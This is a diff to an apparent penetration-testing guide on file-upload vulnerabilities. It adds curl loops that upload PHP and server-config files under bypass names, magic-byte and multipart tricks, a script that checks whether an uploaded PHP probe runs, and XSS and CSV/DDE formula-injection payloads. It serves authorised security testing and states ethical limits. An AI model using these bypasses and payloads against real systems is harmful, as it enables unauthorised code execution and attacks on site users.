@@ -43,7 +43,8 @@ curl -skI "$URL" | grep -iE '^HTTP|content-type|content-disposition|x-content-ty
 for spec in "s.php:application/x-php" "s.php:image/png" "s.PhP:image/png" \
             "s.php.png:image/png" "s.png.php:image/png" "s.phtml:image/png" \
             "s.php5:image/png" "s.svg:image/svg+xml" "s.html:text/html" \
-            "s.xml:text/xml" "s.jsp:image/png" "s.aspx:image/png" "s.htaccess:text/plain"; do
+            "s.xml:text/xml" "s.jsp:image/png" "s.aspx:image/png" \
+            ".htaccess:text/plain" ".user.ini:text/plain" "web.config:text/xml"; do
   n=${spec%%:*}; t=${spec##*:}
   printf '%-16s %-24s ' "$n" "$t"
   curl -sk -X POST "https://$H/api/upload" -H "Authorization: Bearer $TOK_A" \
@@ -51,17 +52,36 @@ for spec in "s.php:application/x-php" "s.php:image/png" "s.PhP:image/png" \
 done
 ```
 
+The last three have to be spelled exactly: Apache parses only its configured `AccessFileName`
+(`.htaccess`), PHP-FPM only `.user.ini`, IIS only `web.config`. A file called `s.htaccess` is
+inert, so a 200 on it proves nothing. Acceptance of the real name *is* the finding - report it as
+an unrestricted upload of a server-config file and delete it; do not go on to install a handler
+mapping, because that reconfigures the target rather than proving anything more.
+
 Then the structural tricks:
 
 ```
-extension:     .php.png  .png.php  .pHp  .php5 .phtml .phar  .php%00.png  .php/  .php.
+extension:     .php.png  .png.php  .pHp  .php5 .phtml .phar  .php/  .php.
                 trailing space or dot: "s.php "  "s.php."
+                .php%00.png - only bites if the app urldecodes the filename itself
 content-type:  declare image/png on a .php · declare application/x-php on a .png
-magic bytes:   prepend GIF89a; or the PNG header \x89PNG\r\n\x1a\n before the payload
+magic bytes:   prepend GIF89a; (6-byte signature + 7-byte screen descriptor, so the payload
+                bytes become the "dimensions") - defeats header sniffers and getimagesize
 multipart:     two `filename=` attributes · a `;` or newline in the filename
                 Content-Disposition with quoted/encoded name: filename="s.php"; filename*=UTF-8''s.php
 archive:       zip containing ../../shell.php (zip-slip) · symlink inside a tar
 ```
+
+Two of those need their limits stated, both measured. **Percent-encoding is not decoded by a
+multipart parser** - `filename="s.php%00.png"` arrives as those literal characters, so `%00` and
+`%2f` test "does the app urldecode the filename", not truncation or traversal. Genuine null-byte
+truncation needs a raw `0x00` in the header value (most HTTP stacks now reject it) and only ever
+affected PHP before 5.3.4, so keep the undecoded `../`, `..\`, `....//` forms as the primary
+traversal probes. **A bare PNG signature is not a bypass**: `\x89PNG\r\n\x1a\n` + script is
+reported by libmagic as plain `data` and rejected by PIL, because PNG carries its dimensions in
+the IHDR chunk - append the payload to a real minimal PNG, or hide it in a `tEXt` chunk, instead.
+`GIF89a;` + payload does pass libmagic (which reads 15419 x 28735 out of the script bytes) but
+still fails a full decoder. Any pipeline that re-encodes the image destroys all of them.
 
 **3. Verify execution, not upload.** A `200` on upload means nothing.
 
@@ -69,17 +89,24 @@ archive:       zip containing ../../shell.php (zip-slip) · symlink inside a tar
 # The marker must be something the SOURCE CANNOT CONTAIN. An echo of a literal string
 # appears in the response whether the file ran or was served as text, so it proves nothing.
 # Use arithmetic the interpreter must evaluate:
-printf 'GIF89a;<?php echo 7*6+7; ?>' > s.php.png
-# upload, then fetch it back and check the NEGATIVE first:
-body=$(curl -sk "$URL")
-if grep -q '<?php' <<<"$body"; then
-  echo "served as source, NOT executed - not RCE"
-elif grep -qx '49' <<<"$body"; then
-  echo "CODE EXECUTED -> RCE"        # 49 cannot appear in the uploaded bytes
-else
-  echo "inconclusive - inspect the body by hand"
-fi
+printf 'GIF89a;<?php echo 7*6+7; ?>' > payload.bin
+# Try the names in handler order, not just one: nginx, IIS and PHP-FPM SetHandler all key on
+# the LAST extension, so s.php.png executes only under Apache mod_mime + AddHandler .php.
+for n in s.png.php s.phtml s.phar s.php.png 's.php.' 's.php '; do
+  cp payload.bin "$n"                 # upload "$n", then fetch its retrieval URL into $URL
+  body=$(curl -sk "$URL")
+  if grep -q '<?php' <<<"$body"; then
+    echo "$n: served as source, NOT executed"
+  elif grep -q '49' <<<"$body"; then
+    echo "$n: CODE EXECUTED -> RCE"   # 49 cannot appear in the uploaded bytes
+  else
+    echo "$n: inconclusive - inspect the body by hand"
+  fi
+done
 ```
+
+Only say "not RCE" after the whole set - and after confirming the store directory is served by
+the app origin at all.
 
 If the payload comes back verbatim with `<?php` visible, the file is being served as static
 content. That is not RCE. It may still be stored XSS if the Content-Type allows.
@@ -95,7 +122,10 @@ SVG           <svg xmlns="http://www.w3.org/2000/svg" onload="alert(91234)"/>
 HTML          plain .html with a script - works when served inline from the app origin
 XML           served as text/xml can render script in some browsers
 PDF           JS in a PDF, when rendered inline by the browser's viewer
-CSV           formula injection: =cmd|'/c calc'!A0  — impacts the person who opens it in Excel
+CSV           formula injection: =1+1 renders as 2 (formula evaluated), or
+              =HYPERLINK("https://collector/x","click") — open it yourself, never send it
+              to a real employee. =cmd|'/c calc'!A0 is the DDE form: cite it as historical,
+              since DDE is off by default in supported Excel builds since 2017-2018
 filename      "><img src=x onerror=alert(91234)>.png   — if the filename is rendered anywhere
 image meta    payload in EXIF Comment, surfaced by a gallery that prints metadata
 ```
